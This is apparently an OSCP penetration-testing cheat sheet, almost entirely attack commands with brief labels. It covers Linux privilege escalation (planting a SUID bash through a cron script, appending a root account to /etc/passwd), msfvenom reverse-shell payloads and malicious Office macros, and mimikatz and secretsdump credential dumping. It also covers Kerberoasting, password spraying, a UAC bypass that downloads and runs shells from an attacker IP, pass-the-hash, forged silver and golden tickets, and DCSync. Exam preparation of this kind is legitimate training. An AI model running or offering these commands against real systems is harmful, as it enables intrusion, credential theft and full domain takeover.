# OSCP Tricks
## Privilege Escalation
### Crontab
#### Enumeration  
```
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```
#### Exploitation  
```
echo "chmod +s /bin/bash" >> script.sh
```

### Services
#### Enumeration  
```
ps aux
```

### SUID
#### Enumeration  
```
find / -perm -u=s -type f 2>/dev/null
```
#### Exploitation
https://gtfobins.github.io/

### Capabiliti3es
#### Enumeration  
```
getcap -r / 2>/dev/null
```
#### Exploitation  
https://gtfobins.github.io/

### Passwd Writabble
#### Enumeration  
```
ls -la /etc/passwd
```
#### Exploitation  
```
echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### Linux Enumeration Tools 
#### Unix Privesc Check
```
./unix-privesc-check
```
https://pentestmonkey.net/tools/audit/unix-privesc-check

#### Linpeas
```
./linpeas.sh
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

### Windows Enumeration Tools
```
winPEASany.exe
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```
windows-privesc-check2.exe --dump -G
```
https://github.com/pentestmonkey/windows-privesc-check

```
. .\PowerUp.ps1
Invoke-AllChecks
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

## Client-Side Attacks
### HTA Attack in Action
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
```

### Microsoft Word Macro Attack
```
python evil_macro.py -l <ip> -p <port> -o macro.txt
```
https://github.com/rodolfomarianocy/Evil-Macro/

## Active Directory
### Enumeration

-> Enumerates all local accounts
```
net user
```

-> Enumerate all users in the entire domain
```
net user /domain
```

-> Get information from a specific user
```
net user <user> /domain
```

-> Enumerate all groups in the entire domain
```
net group /domain
```

-> Find out domain controller hostname
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

-> Enumeration script for all AD users, along with all properties for those user accounts.
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

#### Users currently logged on

-> Enumerate logged users
```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName <computer_name>
```
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

-> Enumerate all active sessions
```
Get-NetSession -ComputerName dc1
```

#### Enumeration Through Service Principal Names
-> PowerShell enumeration script to filter the serviceprincipalname property to the string *http*
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

or

https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1

### Cached Credential Storage and Retrieval
-> Dump the credentials of all connected users, including cached hashes
```
./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
### Extracting hash
```
reg save hklm\sam sam
reg save hklm\system system
```
```
impacket-secretsdump -sam sam -system system LOCAL
```

### Service Account Attacks
-> Sow user tickets that are stored in memory
```
./mimikatz.exe "sekurlsa::tickets"
```

-> Display all cached Kerberos tickets for the current user

```
klist
```

-> Export service tickets from memory
```
./mimikatz.exe "kerberos::list /export"
```

-> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
```

or  

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

### Password Spraying
```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

### Access Validation 
-> crackmapexec
```
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
```
or  
```
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa   
```

### Kerberoast
```
impacket-GetUserSPNs offsec.local/nathan:abc123// -dc-ip 192.168.135.57 -request
```
```
hashcat -a 0 -m 13100 alisson.txt /usr/share/wordlists/rockyou.txt 
```
```
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```
runas /user:offsec\allison cmd.exe
```

### Bypass UAC
#### EventViewer
-> Step 1 - Kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
```
-> Step 2 - Win Owned  
```
cd C:\Windows\tasks
iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```
-> Step 3 - Win Owned  
```
iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
`[+] Run a BypassUAC attack to elevate privileges to admin.`

-> Step 4 -Kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.139 LPORT=8445 -f exe > ok.exe
```
-> Step 5 - Win Owned
```
wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
. .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
Invoke-EventViewer C:\Windows\tasks\shell2.exe
```
https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1

#### Others
https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1

### Active Directory Lateral Movement
#### Pass the Hash
-> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
-> Remote Access 
```
impacket-psexec '<hostname>/<user>'@<ip> -hashes ':<hash>'
```

#### Over Pass the Hash
-> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user

```
mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
```

-> Command execution with psexec  
```
.\PsExec.exe \\dc01 cmd.exe
```

#### Silver Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.

-> get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
-> Get Machine Account Hash
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```
-> Exploitation mimikatz.exe
```
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
```
or
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

#### Golden Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.

-> get hash krbtgt
```
./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
```
-> get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```

-> Exploitation
```
mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"

psexec.exe \\dc1 cmd.exe
```

#### DCSync Attack
-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```
